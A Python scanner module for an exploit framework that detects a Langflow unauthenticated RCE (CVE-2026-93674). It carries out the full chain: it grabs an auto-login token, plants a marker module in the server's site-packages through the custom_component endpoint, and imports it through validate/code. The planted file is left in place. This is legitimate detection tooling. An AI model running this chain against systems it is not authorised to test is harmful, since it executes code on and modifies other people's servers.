import json
import ssl
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

AUTO_LOGIN = "/api/v1/auto_login"
CUSTOM_COMP = "/api/v1/custom_component"
VALIDATE = "/api/v1/validate/code"
MARKER = "METIS_93674_OK"

@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""

class LangflowCve202693674Scanner(Auxiliary):
    NAME = "Langflow import + custom_component RCE Detection (CVE-2026-93674)"
    DESCRIPTION = (
        "Detects unauth RCE via /api/v1/validate/code calling "
        "importlib.import_module() on user-supplied imports, chained with "
        "/api/v1/custom_component planting a module in site-packages. "
        "Uses a benign module that only computes a marker, then validates "
        "by importing it."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "excellent"
    SEVERITY = "critical"
    DISCLOSED = "2026-10-15"
    CHECK = True
    REFERENCES = [
        "CVE-2026-93674",
        "https://www.pruva.dev/reproductions/REPRO-2026-00381",
    ]
    OPTIONS = [
        Option("RHOSTS", required=True, description="target(s)"),
        Option("RPORT", default=7860, type=int, description="Langflow HTTP port"),
        Option("SSL", default=False, type=bool, description="use HTTPS"),
        Option("TIMEOUT", default=15.0, type=float, description="per-request timeout"),
        Option("THREADS", default=20, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool, description="stop after first vulnerable host"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts: raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _base(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return scheme + "://" + host + ":" + str(self.options["RPORT"])

    def _probe(self, host):
        ctx = ssl._create_unverified_context()
        try:
            req = urllib.request.Request(self._base(host) + AUTO_LOGIN)
            req.add_header("User-Agent", "Mozilla/5.0 (metis)")
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                if r.status != 200:
                    return HostResult(host, "safe", "auto_login HTTP " + str(r.status))
                data = json.loads(r.read().decode(errors="replace") or "{}")
        except urllib.error.HTTPError as e:
            return HostResult(host, "safe", "auto_login HTTP " + str(e.code))
        except (urllib.error.URLError, ValueError) as e:
            return HostResult(host, "unknown", type(e).__name__)
        token = data.get("access_token")
        if not token:
            return HostResult(host, "safe", "no token")
        module = "metis_probe_" + uuid_short()
        code = (
            "from langflow.custom import CustomComponent\n"
            "import pathlib, site\n"
            "class P(CustomComponent):\n"
            "    _ = pathlib.Path(site.getsitepackages()[0] + '/"
            + module + ".py').write_text('def mark(): return \"" + MARKER + "\"')\n"
        )
        body = json.dumps({"code": code}).encode()
        req = urllib.request.Request(self._base(host) + CUSTOM_COMP, data=body, method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("Authorization", "Bearer " + token)
        try:
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                if r.status not in (200, 201):
                    return HostResult(host, "safe", "custom_component HTTP " + str(r.status))
        except urllib.error.HTTPError as e:
            return HostResult(host, "safe", "custom_component HTTP " + str(e.code))
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", type(e).__name__)
        body = json.dumps({"code": "import " + module}).encode()
        req = urllib.request.Request(self._base(host) + VALIDATE, data=body, method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("Authorization", "Bearer " + token)
        try:
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                text = r.read().decode(errors="replace"); status = r.status
        except urllib.error.HTTPError as e:
            text = e.read().decode(errors="replace"); status = e.code
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", type(e).__name__)
        if MARKER in text:
            return HostResult(host, "vulnerable", "planted marker observed")
        return HostResult(host, "safe", "HTTP " + str(status) + " without marker")

    def _record(self, h):
        svc = "https" if self.options["SSL"] else "http"
        self.report_host(h.host, state="up")
        self.report_service(h.host, self.options["RPORT"], proto="tcp",
                            state="open", name=svc, banner="Langflow")
        self.report_vuln(name=self.NAME, address=h.host, severity="critical",
                         refs="CVE-2026-93674", info=h.detail)

    def check(self):
        host = self._expand_targets()[0]
        print(colors.info("check: probing " + self._base(host)))
        r = self._probe(host)
        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " vulnerable (" + r.detail + ")"))
            return CheckResult.VULNERABLE
        if r.state == "safe":
            print(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
            return CheckResult.SAFE
        print(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"]); stop_first = self.options["STOP_ON_FIRST"]
        print(colors.info("scanning " + str(len(targets)) + " host(s)"))
        bar = ProgressBar(total=len(targets), prefix="scan")
        hits, clean, unknown, aborted = [], 0, 0, False
        db = self._db(); ws = bool(db and db.current_workspace_id())
        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try: r = fut.result()
                    except Exception: unknown += 1; continue
                    if r.state == "vulnerable":
                        hits.append(r); bar.log(colors.vuln(r.host + " - " + r.detail))
                        if ws: self._record(r)
                        if stop_first:
                            aborted = True
                            for f in futures: f.cancel()
                            break
                    elif r.state == "safe": clean += 1
                    else: unknown += 1
        finally:
            bar.done()
        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.warn(str(unknown)))
        if aborted: print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        return hits

import secrets as _secrets
def uuid_short():
    return _secrets.token_hex(4)
